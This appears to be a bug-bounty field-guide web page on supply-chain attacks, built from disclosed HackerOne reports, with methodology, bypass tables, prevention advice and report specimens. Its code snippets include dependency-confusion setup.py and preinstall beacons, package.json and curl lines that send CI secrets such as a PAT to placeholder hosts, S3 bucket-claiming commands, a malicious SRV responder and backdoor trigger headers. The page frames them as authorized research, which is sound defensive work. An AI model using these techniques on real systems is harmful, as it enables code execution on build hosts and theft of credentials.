@@ -1,0 +1,573 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Supply Chain &amp; Malicious Code · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Supply Chain &amp; Malicious Code</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="on" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>Supply Chain &amp; Malicious Code</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>31</b></span><span class="chip">No direct PortSwigger lab</span></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>A supply-chain bug lets you compromise software <strong>before it reaches the target</strong> — you poison a dependency it installs, a build input it fetches, or the CI pipeline that publishes it, so your code runs on developer laptops, CI runners, and every downstream consumer that trusts the artifact. The impact is almost always <strong>code execution at install-time or build-time</strong>: a package's <code>setup.py</code>/gemspec hook, an npm lifecycle script, a jar that runs during tests, a workflow step with secrets in <code>env</code>.</p>
+<p>What makes the class distinctive is the <strong>blast radius</strong> — the target isn't one app, it's "everyone who runs <code>pip install</code>, <code>bundle install</code>, or pulls the release." The whole game is the same two-step: find a <strong>trusted fetch</strong> (a name a resolver looks up, a URL a script curls, a handle CI references) and prove that <strong>you</strong> can control what comes back. Whether that's an unclaimed registry name, an <code>http://</code> jar, a dangling S3 bucket, or a fork-PR checkout, the sink is the same: trusted automation executes attacker-controlled bytes.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Enumerate the trusted fetches.</strong> Harvest package names from manifests/lockfiles (<code>Gemfile.lock</code>, <code>requirements.txt</code>, <code>package.json</code>, <code>pom.xml</code>, <code>Cargo.toml</code>), and pull remote URLs and handles out of <code>install.sh</code>/<code>Dockerfile</code>/<code>Makefile</code>/CI YAML. Names also leak in JS bundles, error messages, public repos, and CI configs.</li><li><strong>Classify each fetch by resolver.</strong> Registry name → dependency confusion. <code>http://</code> jar/tarball → MITM. Fork-PR checkout in a privileged workflow → <code>pull_request_target</code> RCE. Hardcoded artifact host → dangling-host takeover. Auto-merge bot / DNS SRV → parser/differential.</li><li><strong>Test controllability.</strong> Is the name unclaimed (or beatable by version) on the public registry? Is the download over plain HTTP with <strong>no adjacent checksum/signature</strong>? Does the bucket return <code>NoSuchBucket</code>? Is the org/action handle re-registerable?</li><li><strong>Plant a proof-only callback.</strong> For anything that reaches execution, ship a <strong>benign phone-home</strong> (host, user, cwd) — never a real payload. The confirming tell is an out-of-band callback from the <em>build/CI host</em>, not your own machine.</li><li><strong>Trace the escalation.</strong> Build-time RCE is already the top of one chain; walk it outward to secret theft, malicious merge, and a poisoned release consumed downstream.</li></ol>
+<div class="pre" data-lang="bash"># Dependency-confusion claimability probe (per harvested name)
+pip  index versions PKG 2&gt;&amp;1 | grep -qi "no matching"  &amp;&amp; echo "PyPI UNCLAIMED: PKG"
+npm  view PKG version   2&gt;&amp;1 | grep -qi "E404"          &amp;&amp; echo "npm  UNCLAIMED: PKG"
+gem  list -r -e PKG     2&gt;&amp;1 | grep -q  "^$"             &amp;&amp; echo "gem  UNCLAIMED: PKG"
+# tell: referenced internally but absent (or lower version) on the public registry -&gt; claimable</div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Group each trusted fetch by the resolver it abuses, then use the matching primitive.</p>
+<h3 class="sub" id="dependency-confusion">Dependency confusion</h3>
+<p>An internal package name that isn't reserved (or is out-versioned) on the public registry. <code>pip</code>/<code>npm</code>/Bundler resolve the <strong>highest version across all configured indexes</strong>, so a high-versioned public package of the same name wins over the private one. Install alone runs the hook — the package need not be <code>require</code>d.</p>
+<div class="pre" data-lang="python"># setup.py — runs on `pip install PKG`; phone home ONLY, to respect scope
+import socket, getpass, os, urllib.request, urllib.parse
+data = {'host': socket.gethostname(), 'cwd': os.getcwd(), 'user': getpass.getuser()}
+urllib.request.urlopen('https://COLLAB/?d=' + urllib.parse.urlencode(data))</div>
+<div class="pre" data-lang="bash"># publish with a HIGH version so it beats any internal package of the same name
+gem push okra-90002.0.gem     # RubyGems  (#1104874)
+npm publish                   # package.json scripts.preinstall = payload  (#462503, #925585)</div>
+<h3 class="sub" id="insecure-build-fetch-http-no-integrity">Insecure build fetch (HTTP / no integrity)</h3>
+<p>A repository or resolver declared as <code>http://</code>, or a CI <code>wget</code>/<code>curl</code> of a tarball with <strong>no checksum or signature gate</strong>. A network MITM rewrites the artifact in flight; jars run during unit/integration tests and plugins → RCE on the build host and a poisoned release.</p>
+<div class="pre" data-lang="bash"># insecure repo URLs and unverified downloads
+grep -rniE 'http://[^"'"'"' ]*(maven|repo|repository|jcenter|central)' .   # pom/gradle/ivy/sbt
+grep -rniE '(wget|curl)[^|]*http://' .                                     # CI shell fetches
+# tell: an http:// jar/tarball feeds the build AND there is no adjacent sha256sum / gpg --verify</div>
+<div class="pre" data-lang="bash"># transparent MITM that injects bytecode into fetched JARs (Dilettante, #506161)
+python dilettante.py                                          # edit target repo host at line 143
+mvn -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=8080 test    # injected class runs = RCE</div>
+<h3 class="sub" id="pull-request-target-ci-rce"><code>pull_request_target</code> CI RCE</h3>
+<p>A GitHub Actions workflow triggered by <code>pull_request_target</code> runs in the <strong>base-repo context with secrets</strong>, but checks out and executes fork-PR code. Unlike <code>pull_request</code>, this trigger exposes secrets to fork PRs by design — developers assume it's safe. Any checkout of the PR head plus a <code>run</code> step is untrusted-code RCE with tokens in <code>env</code>.</p>
+<div class="pre" data-lang="yaml"># vulnerable workflow: privileged context, secrets in env, checks out attacker head
+on: pull_request_target
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # attacker-controlled
+      - run: npm install &amp;&amp; npm run build                  # runs attacker code with secrets</div>
+<div class="pre" data-lang="json">// exfil from the fork PR's package.json — build/postinstall runs on the runner
+"scripts": { "build": "curl https://COLLAB/?k=$PRIVACY_CONFIG_PAT" }</div>
+<h3 class="sub" id="dangling-artifact-host-takeover">Dangling artifact host takeover</h3>
+<p>An <code>install.sh</code>/<code>Dockerfile</code>/<code>Makefile</code> curls a build artifact from a <strong>hardcoded remote</strong> — an S3 bucket, GCS path, or GitHub release — that was never created. Claim it and every install fetches your file; in a run-as-root installer that's broad RCE. Same primitive as subdomain takeover, but for artifact hosts.</p>
+<div class="pre" data-lang="bash"># read the URL out of the install script, then probe + claim it
+aws s3 ls s3://rocketchatbuild                        # NoSuchBucket -&gt; claimable  (#399166)
+aws s3 mb s3://rocketchatbuild
+aws s3 cp poc.tgz s3://rocketchatbuild/rocket.chat-develop.tgz
+# the installer now curls + untars your artifact on every run</div>
+<h3 class="sub" id="trust-gate-automation-service-discovery">Trust-gate automation &amp; service discovery</h3>
+<p>Bots that <strong>parse diffs to gate trust</strong>, and clients that do <strong>service discovery over unauthenticated DNS</strong>, are supply-chain sinks: if the parser or resolver disagrees with reality, you smuggle code past review. A crafted diff hides added lines from an auto-merge bot; a poisoned SRV target points a package client at your server.</p>
+<div class="pre" data-lang="bash"># git-diff parser confusion: smuggled Ruby lands in an auto-merged cask  (#1167608)
+++ "b/#{puts 'poc';b = 1;Casks = 1;iterm2 = {};iterm2.define_singleton_method(:rb) do 1 end; }" # rubocop:disable all
+++ "b/" if # rubocop:disable all
+++ b/Casks/iterm2.rb</div>
+<div class="pre" data-lang="ruby"># malicious SRV responder: point the gem client at an attacker source  (#218088)
+match(//, IN::SRV) do |transaction|
+  transaction.respond!(0, 0, 53, "evil.com/api.rubygems.com")   # path smuggled past suffix check
+end</div>
+<h3 class="sub" id="backdoored-typosquatted-packages">Backdoored &amp; typosquatted packages</h3>
+<p>A package that is <strong>malicious by design</strong> — a typosquat of a popular name, or a transitive dep hiding a backdoor. Behavior is obfuscated to survive review: hex-encoded module names, magic-byte protocols, code fed from request data into <code>vm.runInThisContext</code>/<code>eval</code>.</p>
+<div class="pre" data-lang="bash"># getcookies backdoor: stage JS bytes as headers, then trigger  (#346516)
+curl -i 'http://TARGET/' -H 'X-Hacker: g0000h636465i'    # stage code bytes
+curl -i 'http://TARGET/' -H 'X-Hacker: gfaffh636465i'    # trigger header -&gt; vm.runInThisContext</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Ship a <strong>proof-only</strong> phone-home (host + user + cwd) for every install/build-time primitive — never a real payload. The callback must arrive from the <em>victim's build/CI host</em> to prove execution context; a callback from your own laptop proves nothing.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<p>The recurring theme is <strong>fail-open verification</strong>: any check that returns "match/ok" when it cannot parse its input is a bypass. Feed malformed and alternate-encoding values and confirm it fails <em>closed</em>.</p>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Unscoped internal source</td><td>higher public <strong>version number</strong> trumps the internal package</td><td>#1104874, #946409</td></tr><tr><td>Diff-based PR review</td><td>check out the fork as the <strong>base</strong> so diff validation sees no change</td><td>#3619288</td></tr><tr><td>Auto-review diff parser</td><td><code>git_diff</code> gem parses a crafted diff differently from git, hiding added Ruby</td><td>#1167608</td></tr><tr><td>Downstream CI gate</td><td><code># rubocop:disable all</code> so lint passes and auto-merge proceeds</td><td>#1167608</td></tr><tr><td>Subresource Integrity</td><td><code>sha256--</code> / base64url hash unparsed → <code>bytesMatch</code> returns true, no check</td><td>#2377760</td></tr><tr><td>Gem signature verify</td><td>verify-vs-install <strong>tar parser differential</strong> forges a valid signature</td><td>#275269</td></tr><tr><td>lockfile hash gating</td><td>broken integrity/hash comparison lets a poisoned cache entry pass</td><td>#703138</td></tr><tr><td>SRV target suffix check</td><td>path smuggling (<code>evil.com/api.rubygems.com</code>) passes a naive suffix match</td><td>#218088</td></tr><tr><td>Package review</td><td><code>require('\x76\x6d')</code> (=vm) + magic-byte header protocol evades manual review</td><td>#346516</td></tr><tr><td>Registry-link trust</td><td>platform auto-links an unpublished manifest name to public npm — social, no resolver</td><td>#462503</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A missing checksum or an <code>http://</code> repo URL with <strong>no demonstrated fetch you can tamper</strong> is a best-practice nag, not a finding. Show the artifact actually feeds the build with no integrity gate (or claim the dangling host / register the name and catch the callback) — otherwise it closes as informative.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Supply-chain bugs are already the top of one chain — install/build-time RCE — but the value is in walking them <strong>outward to downstream consumers</strong>:</p>
+<ul><li><strong>Dependency confusion → CI RCE → artifact backdoor</strong> — code exec on the build server lets you backdoor the release the org ships to everyone (<code>#946409</code>: two Yelp packages fired on Jenkins and TravisCI).</li><li><strong><code>pull_request_target</code> → runner RCE → PAT theft → malicious merge → poisoned release</strong> — steal <code>PRIVACY_CONFIG_PAT</code>/<code>ASANA_ACCESS_TOKEN</code> (<code>#3619288</code>) or abuse <code>GITHUB_TOKEN</code> to label a PR and trigger the automated release pipeline (<code>#3619287</code>), reaching every downstream browser/extension.</li><li><strong>Diff-parser confusion → auto-merge → mass RCE</strong> — smuggled Ruby lands in official Homebrew Casks and runs on <em>every</em> cask install (<code>#1167608</code>).</li><li><strong>Dangling host / renamed handle → CI action or docs takeover</strong> — re-register the org/action (<code>#1439355</code>) or account referenced by official docs (<code>#1434967</code>); same primitive as subdomain takeover, for code/artifact hosts.</li><li><strong>Insecure update channel → tampered download → RCE</strong> — an app that self-updates over HTTP with no signature is a supply-chain RCE on every user (<code>#982130</code>, CVE-2021-40099).</li></ul>
+<details class="fold"><summary>Full mined variant list (one-liners, best-first)</summary><div class="body"><ul><li><strong>#946409</strong> (Yelp, critical, 366) — internal pip name claimed on public PyPI; <code>setup.py</code> fired on CI.</li><li><strong>#1104874</strong> (Basecamp, high, $5k) — internal gem <code>okra</code> squatted on RubyGems; high version wins.</li><li><strong>#3619288 / #3619287</strong> (DuckDuckGo, critical) — <code>pull_request_target</code> fork RCE + PAT/API-key exfil.</li><li><strong>#1167608</strong> (Homebrew, critical) — git-diff parser confusion auto-merges Ruby into official Casks.</li><li><strong>#506161 / #1039504</strong> (PortSwigger, ibb) — HTTP Maven/Gradle/CI jars MITM'd in flight → build RCE.</li><li><strong>#346516</strong> (npm getcookies) — backdoored transitive dep runs code from crafted request headers.</li><li><strong>#399166 / #1285598</strong> (Rocket.Chat, Reddit) — claim an unclaimed S3 bucket referenced by an install/CI script.</li><li><strong>#218088 / #275269 / #392311</strong> (RubyGems) — SRV DNS hijack, gem-signature tar differential, typosquat native-ext backdoor.</li><li><strong>#2377760 / #703138</strong> (Node.js) — SRI fail-open on malformed hash; yarn.lock cache poisoning.</li><li><strong>#462503 / #925585 / #1364851</strong> — npm/SVN dependency confusion via unpublished/unclaimed names.</li><li><strong>#1439355 / #1434967</strong> — renamed GitHub org / dangling account referenced by CI or docs.</li><li><strong>#794407 / #212067 / #2255750</strong> — forked-PR secret exfil, CI token in build logs, build-cache poisoning.</li><li><strong>#982130 / #186352</strong> — insecure HTTP update channel / root-run installer over HTTP.</li></ul></div></details>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Dependency confusion</strong> — scope/pin internal sources (Bundler ≥ 2.2.10 source scoping, npm <code>.npmrc</code> scope→registry, private-index-first with no public fallback) or reserve the internal names on the public registry. A claimed/scoped name is non-exploitable.</li><li><strong>Build fetches</strong> — <code>https://</code> <strong>plus</strong> mandatory <code>sha256sum</code>/<code>gpg --verify</code>. If a checksum is enforced, MITM is dead; a missing checksum is the actual bug, not the URL scheme alone.</li><li><strong><code>pull_request_target</code></strong> — never check out or execute untrusted head code in the privileged job; gate on a manual <code>label</code>/environment approval, or use <code>pull_request</code> (no secrets) for anything that runs fork code.</li><li><strong>Integrity checks</strong> — must <strong>fail closed</strong> on unparsable or alternate-encoding input; test them with <code>sha256--</code>, base64url, and truncated values.</li><li><strong>Artifact hosts &amp; handles</strong> — pre-create buckets and reserve org/action names so they can't dangle; treat a renamed org exactly like an expiring domain.</li><li><strong>Transitive deps</strong> — review for obfuscated <code>vm.runInThisContext</code>/<code>eval</code> fed from request data and hex-encoded module names; pin and lock, and prefer install without lifecycle scripts (<code>--ignore-scripts</code>) in CI.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Registry CLIs</strong> — <code>pip index versions</code>, <code>npm view</code>, <code>gem list -r</code> for claimability checks.</li><li><strong><code>grep -rniE</code></strong> over <code>pom.xml</code>/<code>build.gradle</code>/<code>.travis.yml</code>/<code>Dockerfile</code>/<code>Makefile</code>/<code>.github/workflows</code> for <code>http://</code> fetches, missing checksums, and <code>pull_request_target</code>.</li><li><strong>Dilettante</strong> — transparent MITM proxy that injects bytecode into fetched JARs (<code>#506161</code>).</li><li><strong><code>aws s3 ls/mb</code></strong> — probe and claim dangling artifact buckets (<code>#399166</code>).</li><li><strong>Burp Collaborator / interactsh</strong> — the out-of-band callback that confirms install/build-time execution.</li><li><strong>Source-audit</strong> tooling (JD-GUI, dnSpy, <code>npm ls</code>/<code>cargo tree</code>) for tracing transitive-dep backdoors and lockfile trees.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>31</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-925585" style="--sv:var(--sev-crit)" data-sev="4" data-votes="933" data-bounty="30000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dependency confusion (internal npm names on public registry)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#925585</b> · paypal · 30000 · 933 votes · resolved</div>
+<div class="taxo"><span>Program <b>paypal</b></span><span>Surface <b>other</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Build tooling defaulted to the public npm registry for package names that only existed internally; an attacker can register those exact names publicly and the higher version is pulled and executed during internal builds.</p>
+<h4>Method</h4><ol><li>Enumerate internal package names (leaked package.json, source maps, error logs, .npmrc scopes)</li><li>Publish a same-named package to the public registry with a higher semver and a preinstall/postinstall script that beacons out</li><li>Wait for internal CI/dev machines to resolve and install the public package</li><li>Confirm code execution via DNS/HTTP callback from inside the corp network</li></ol>
+<div class="pre">// package.json of the malicious public package
+{
+  "name": "&lt;internal-pkg-name&gt;",
+  "version": "99.99.99",
+  "scripts": { "preinstall": "node beacon.js" }
+}
+// beacon.js: exfil hostname/whoami/dns to attacker collab</div>
+<p class="insight"><b>Insight —</b> Any ecosystem mixing private and public registries (npm scopes, PyPI, RubyGems, Maven) is exploitable when internal names are not reserved publicly and no scope/registry pinning is enforced. Harvest dependency names from leaked manifests and claim them.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/925585" target="_blank" rel="noopener">hackerone.com/reports/925585</a></span><a class="src" href="#report-925585" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-946409" style="--sv:var(--sev-crit)" data-sev="4" data-votes="366" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Dependency confusion: internal pip package name claimed on public PyPI</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#946409</b> · yelp · awarded · 366 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>other</b></span><span>Chain <b>Public-registry name squat -&gt; build-time setup.py executi</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A package that should resolve from an internal/private registry gets resolved from the public registry when the same name is unclaimed there (or a higher version is published publicly). Installing it runs attacker-controlled setup.py at build time.</p>
+<h4>Method</h4><ol><li>Harvest internal package names referenced by the target (leaked requirements.txt/package.json, error messages, JS bundles, public repos, CI configs).</li><li>Check whether each name is unclaimed on the public registry (PyPI/npm/RubyGems).</li><li>Register the unclaimed name on the public registry with a benign setup.py/preinstall that only phones home (IP, hostname, cwd) to prove execution -- no further action, to respect scope.</li><li>Wait for a misconfigured build/CI job to install it from public instead of internal; the callback confirms RCE context.</li><li>Report the callback host/IP/path as proof (here: Jenkins + TravisCI build servers).</li></ol>
+<div class="pre"># setup.py in the malicious package (PoC callback only)
+import socket, getpass, os, urllib.request
+data = {
+  'hostname': socket.gethostname(),
+  'cwd': os.getcwd(),
+  'user': getpass.getuser(),
+}
+urllib.request.urlopen('https://COLLAB/?d=' + urllib.parse.urlencode(data))
+
+# packaged so setup.py runs on `pip install yelp-cgeom`</div>
+<p class="insight"><b>Insight —</b> Any private/internal package name your target uses is an RCE primitive if that name is unclaimed (or beatable by version) on the public registry. Enumerate internal package names first, then squat the unclaimed ones with a proof-only phone-home. Two Yelp packages fired (yelp-cgeom, clusterman_metrics), including a name leaked in a public repo -&gt; assume public repos also expose internal names.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/946409" target="_blank" rel="noopener">hackerone.com/reports/946409</a></span><a class="src" href="#report-946409" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-3619288" style="--sv:var(--sev-crit)" data-sev="4" data-votes="61" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GitHub Actions pull_request_target RCE + PAT exfiltration (fork checkout with secrets)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#3619288</b> · duckduckgo · none · 61 votes · resolved</div>
+<div class="taxo"><span>Program <b>duckduckgo</b></span><span>Surface <b>cloud</b></span><span>Chain <b>pull_request_target -&gt; runner RCE -&gt; PAT theft -&gt; m</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">auto-respond-pr.yml runs on pull_request_target (privileged, has secrets) and checks out the fork's head repo (repository: github.event.pull_request.head.repo.full_name) as BOTH base and PR, then runs npm ci + node index.js on attacker code with PRIVACY_CONFIG_PAT in env -&gt; arbitrary code execution and secret exfiltration.</p>
+<h4>Method</h4><ol><li>Find workflows triggered by pull_request_target that also check out PR/fork code</li><li>Open a fork PR whose head contains malicious build/postinstall or index.js</li><li>Workflow executes attacker code in privileged context; read/exfil secrets ($PRIVACY_CONFIG_PAT, ASANA_ACCESS_TOKEN, GH_RO_PAT) from env</li><li>Use the stolen repo-scoped PAT to auto-approve/merge a malicious PR -&gt; supply-chain compromise of downstream products</li></ol>
+<div class="pre"># in fork PR (executed by npm ci / node index.js on the runner)
+curl https://attacker/$(echo $PRIVACY_CONFIG_PAT)
+# root cause line:
+#   repository: ${{ github.event.pull_request.head.repo.full_name }}</div>
